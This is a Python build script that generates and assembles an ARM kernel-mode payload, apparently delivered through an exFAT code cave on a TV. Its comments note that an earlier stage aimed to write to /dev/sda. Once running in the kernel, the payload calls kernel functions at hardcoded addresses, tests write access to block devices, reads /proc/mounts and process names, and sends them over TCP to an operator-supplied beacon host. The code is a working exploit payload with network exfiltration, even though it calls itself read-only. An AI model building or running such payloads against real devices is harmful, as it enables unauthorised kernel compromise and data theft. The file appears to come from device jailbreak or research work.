#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only
# Kant-M2 adaptation; see docs/PROVENANCE.md.
"""Kant-M2 kernel TCP probe stage (read-only, no disk writes, no UEP, no bash).

Purpose: explain why the previous stage's filp_open("/dev/sda")/kernel_write
markers never appeared. This stage only *reads* and reports over TCP:

  word 0  magic "KANT"
  word 1  0x00010001
  word 2  sock_create() return
  word 3  kernel_connect() return
  word 4  filp_open("/dev/sda",   O_RDONLY)
  word 5  filp_open("/dev/sda",   O_WRONLY)
  word 6  filp_open("/dev/sdb",   O_WRONLY)
  word 7  filp_open("/dev/sda1",  O_WRONLY)
  word 8  filp_open("/dev/sdb1",  O_WRONLY)
  word 9  filp_open("/proc/mounts", O_RDONLY)
  word 10 bytes read from /proc/mounts
  word 11 filp_open("/proc/self/comm", O_RDONLY)
  word 12 bytes read from /proc/self/comm
  word 13 trailer "KBEK"
then: comm bytes, then /proc/mounts bytes.

Negative filp_open results are -errno as ERR_PTR values (0xfffff...). No data
is written to any block device. The payload parks after the transfer so the
watchdog reboots the TV in ~20 s; removing the stick recovers.

Absolute addresses come from __ksymtab in the verified kernel.bin, using the
same validated resolver as the marker builder.

exFAT constraint: every 16-bit halfword of the payload must be non-zero, so
no store/load may use an immediate offset of 0 (imm12=0 makes a 0x0000
halfword). All frames therefore start at offset 4.
"""
import argparse
import os
import shutil
import socket
import struct
import subprocess
import tempfile

from build_kernel_stage_kant import asm_string, extract_text, disasm

FILP_OPEN = 0xC00F2D58
FILP_CLOSE = 0xC00F1C68
KERNEL_READ = 0xC00F91E4
SOCK_CREATE = 0xC03C0F8C
KERNEL_CONNECT = 0xC03C1500
KERNEL_SENDMSG = 0xC03C1134
SOCK_RELEASE = 0xC03C0C04
PARK = 0xC04CC05C
EMERGENCY_RESTART = 0xC0044BC8

SCRATCH = 0xC0008C00     # beyond the payload, inside the fixed cave span
HDR = SCRATCH + 0x04     # 14 words = 56 bytes, offset 4 avoids imm12=0
COMM = SCRATCH + 0x40
MOUNTS = SCRATCH + 0x60

SEND_BUF = """
send_buf:
    push    {r4, r5, r6, r7, r8, lr}
    sub     sp, sp, #0x30
    mov     r6, sp
    mov     r7, r1               @ size
    mov     r8, r0               @ buffer
    mov     r5, #1
    sub     r5, r5, #1           @ r5 = 0
    str     r5, [r6, #0x04]      @ msg_name
    str     r5, [r6, #0x08]      @ msg_namelen
    add     r2, r6, #0x24
    str     r2, [r6, #0x0c]      @ msg_iov
    mov     r2, #1
    str     r2, [r6, #0x10]      @ msg_iovlen
    str     r5, [r6, #0x14]      @ msg_control
    str     r5, [r6, #0x18]      @ msg_controllen
    str     r5, [r6, #0x1c]      @ msg_flags
    str     r8, [r6, #0x24]      @ kvec.base
    str     r7, [r6, #0x28]      @ kvec.len
    mov     r0, r9               @ sock
    add     r1, r6, #0x04        @ msghdr
    add     r2, r6, #0x24        @ kvec
    mov     r3, #1               @ num
    push    {r7, r12}            @ 5th arg = size, kept 8-byte aligned
    ldr     r4, kernel_sendmsg_addr
    blx     r4
    add     sp, sp, #8
    add     sp, sp, #0x30
    pop     {r4, r5, r6, r7, r8, pc}
"""


def emit(host, port):
    ver = 0x00010001
    magic = 0x544E414B           # "KANT"
    trailer = 0x4B42454B         # "KBEK"
    ip = [int(x) for x in host.split(".")]
    if len(ip) != 4 or any(not (0 <= x <= 255) for x in ip):
        raise SystemExit("--beacon must be a dotted IPv4 address")
    # sockaddr_in packs as: u16 sin_family (host order, little-endian) then
    # __be16 sin_port (network order) then struct in_addr (network order).
    # As one little-endian u32 word that is family | (htons(port) << 16):
    # port 4444 -> 0x5c110002 -> memory bytes 02 00 11 5c.
    # Using (port << 16) stores 02 00 5c 11, i.e. port 0x5c11 = 23569.
    w0 = 0x0002 | (socket.htons(port) << 16)
    w1 = ip[0] | (ip[1] << 8) | (ip[2] << 16) | (ip[3] << 24)

    def addr(reg, label):
        return (
            f"    movw    {reg}, #:lower16:({label} - _start + 0xc0008470)\n"
            f"    movt    {reg}, #:upper16:({label} - _start + 0xc0008470)\n"
        )

    def call(label):
        return (
            f"    movw    r12, #:lower16:({label} - _start + 0xc0008470)\n"
            f"    movt    r12, #:upper16:({label} - _start + 0xc0008470)\n"
            "    blx     r12\n"
        )

    def const(reg, value):
        return (f"    movw    {reg}, #{value & 0xFFFF:#06x}\n"
                f"    movt    {reg}, #{(value >> 16) & 0xFFFF:#06x}\n")

    def ptr0(value):
        """Load a 0xc000xxxx constant into r0 via r6: movt r0,#0xc000 would
        encode as e34c0000 and put a forbidden 0x0000 halfword in the name."""
        return const('r6', value) + "    mov     r0, r6\n"

    def probe(label, flags, off):
        """filp_open(path, flags, 0) -> store raw return at HDR+off."""
        flag_ins = "    mov     r1, r11\n" if flags == 0 else "    mov     r1, #1\n"
        return (
            addr("r12", label)
            + "    mov     r0, r12\n"
            + flag_ins
            + "    mov     r2, r11\n"
            + "    ldr     r4, filp_open_addr\n"
            + "    blx     r4\n"
            + f"    str     r0, [r10, #{off:#04x}]\n"
        )

    body = f""".syntax unified
.arm
.global _start
.section .text
_start:
    ldr     r4, saved_ip_addr
    ldr     sp, [r4]
    sub     sp, sp, #0x400
    bic     sp, sp, #7
    sub     sp, sp, #0x80

    mov     r11, #1
    sub     r11, r11, #1          @ r11 = 0
{const('r7', 0xFFFFF000)}
{const('r10', SCRATCH)}
    @ sockaddr_in at sp+4
{const('r0', w0)}
    str     r0, [sp, #0x04]
{const('r0', w1)}
    str     r0, [sp, #0x08]
    str     r11, [sp, #0x0c]
    str     r11, [sp, #0x10]

    @ sock_create(AF_INET=2, SOCK_STREAM=1, 0, &sock at sp+0x14)
    mov     r0, #2
    mov     r1, #1
    mov     r2, r11
    add     r3, sp, #0x14
    ldr     r4, sock_create_addr
    blx     r4
    str     r0, [r10, #0x0c]      @ header word 2
    ldr     r9, [sp, #0x14]       @ sock

    @ header constants
{const('r0', magic)}
    str     r0, [r10, #0x04]      @ word 0
{const('r0', ver)}
    str     r0, [r10, #0x08]      @ word 1
{const('r0', trailer)}
    str     r0, [r10, #0x38]      @ word 13

    @ --- read-only probes: no writes to any device ---
{probe('path_sda', 0, 0x14)}{probe('path_sda', 1, 0x18)}{probe('path_sdb', 1, 0x1c)}{probe('path_sda1', 1, 0x20)}{probe('path_sdb1', 1, 0x24)}{probe('path_mounts', 0, 0x28)}{probe('path_comm', 0, 0x30)}
    @ connect only if sock_create() == 0
    ldr     r0, [r10, #0x0c]
    add     r0, r0, #1
    cmp     r0, #1
    blt     fail
    mov     r0, r9
    add     r1, sp, #0x04
    mov     r2, #16
    mov     r3, r11
    ldr     r4, kernel_connect_addr
    blx     r4
    str     r0, [r10, #0x10]      @ word 3
    add     r0, r0, #1
    cmp     r0, #1
    blt     fail

    @ --- read /proc/mounts ---
    ldr     r0, [r10, #0x28]
    cmp     r0, r7
    bhs     skip_mounts
    str     r11, [sp, #0x1c]
    str     r11, [sp, #0x20]
{const('r1', MOUNTS)}
    mov     r2, #0x380
    add     r3, sp, #0x1c
    ldr     r4, kernel_read_addr
    blx     r4
    str     r0, [r10, #0x2c]      @ word 10
skip_mounts:

    @ --- read /proc/self/comm ---
    ldr     r0, [r10, #0x30]
    cmp     r0, r7
    bhs     skip_comm
    str     r11, [sp, #0x24]
    str     r11, [sp, #0x28]
{const('r1', COMM)}
    mov     r2, #32
    add     r3, sp, #0x24
    ldr     r4, kernel_read_addr
    blx     r4
    str     r0, [r10, #0x34]      @ word 12
skip_comm:

    @ --- send header, comm, mounts ---
{ptr0(HDR)}
    mov     r1, #56
{call('send_buf')}
    ldr     r1, [r10, #0x34]
    add     r0, r1, #1
    cmp     r0, #1
    blt     skip_send_comm
{ptr0(COMM)}
{call('send_buf')}
skip_send_comm:
    ldr     r1, [r10, #0x2c]
    add     r0, r1, #1
    cmp     r0, #1
    blt     park
{ptr0(MOUNTS)}
{call('send_buf')}

fail:
    ldr     r4, emergency_restart_addr
    blx     r4
    b       fail

park:
    movw    r0, #0xffff
    movt    r0, #0x7fff
    ldr     r4, park_addr
    blx     r4
    b       park

path_sda:    .asciz "/dev/sda"
    .balign 4, 0x41
path_sdb:    .asciz "/dev/sdb"
    .balign 4, 0x41
path_sda1:   .asciz "/dev/sda1"
    .balign 4, 0x41
path_sdb1:   .asciz "/dev/sdb1"
    .balign 4, 0x41
path_mounts: .asciz "/proc/mounts"
    .balign 4, 0x41
path_comm:   .asciz "/proc/self/comm"
    .balign 4, 0x41

{SEND_BUF}
    .balign 4, 0x41
saved_ip_addr:       .word 0xc0008d00
sock_create_addr:    .word {SOCK_CREATE:#010x}
kernel_connect_addr: .word {KERNEL_CONNECT:#010x}
kernel_sendmsg_addr: .word {KERNEL_SENDMSG:#010x}
kernel_read_addr:    .word {KERNEL_READ:#010x}
filp_open_addr:      .word {FILP_OPEN:#010x}
sock_release_addr:   .word {SOCK_RELEASE:#010x}
park_addr:           .word {PARK:#010x}
emergency_restart_addr: .word {EMERGENCY_RESTART:#010x}
"""
    return body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--beacon", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--keep-asm")
    ap.add_argument("--disasm", action="store_true")
    a = ap.parse_args()

    host, port_s = a.beacon.rsplit(":", 1)
    if not port_s.isdigit():
        raise SystemExit("--beacon must be IP:PORT")
    src_text = emit(host, int(port_s))

    clang = shutil.which("clang")
    if not clang:
        raise SystemExit("clang not found")
    if a.keep_asm:
        open(a.keep_asm, "w").write(src_text)
        print(f"wrote {a.keep_asm}")
    with tempfile.TemporaryDirectory(prefix="kant-kbeacon-") as td:
        src = os.path.join(td, "stage.S")
        obj = os.path.join(td, "stage.o")
        open(src, "w").write(src_text)
        subprocess.run(
            [clang, "-target", "armv7-none-eabi", "-march=armv7-a",
             "-c", src, "-o", obj],
            check=True)
        blob = extract_text(obj)
    if len(blob) % 4:
        raise SystemExit(f".text length {len(blob)} is not 4-byte aligned")
    zeros = [i for i in range(0, len(blob), 2)
             if struct.unpack_from("<H", blob, i)[0] == 0]
    if zeros:
        raise SystemExit(
            f"generated payload contains zero halfwords at "
            f"{[hex(x) for x in zeros]}")
    if 0xc0008470 + len(blob) > SCRATCH:
        raise SystemExit(
            f"payload {len(blob)} bytes overlaps scratch at {SCRATCH:#x}")
    open(a.out, "wb").write(blob)
    print(f"wrote {a.out}: {len(blob)} bytes, zero_halfwords=[]")
    print(f"payload {0xc0008470:#x}..{0xc0008470+len(blob)-1:#x}, "
          f"scratch {SCRATCH:#x}..{0xc0008fff:#x}")
    if a.disasm:
        disasm(blob)


if __name__ == "__main__":
    main()
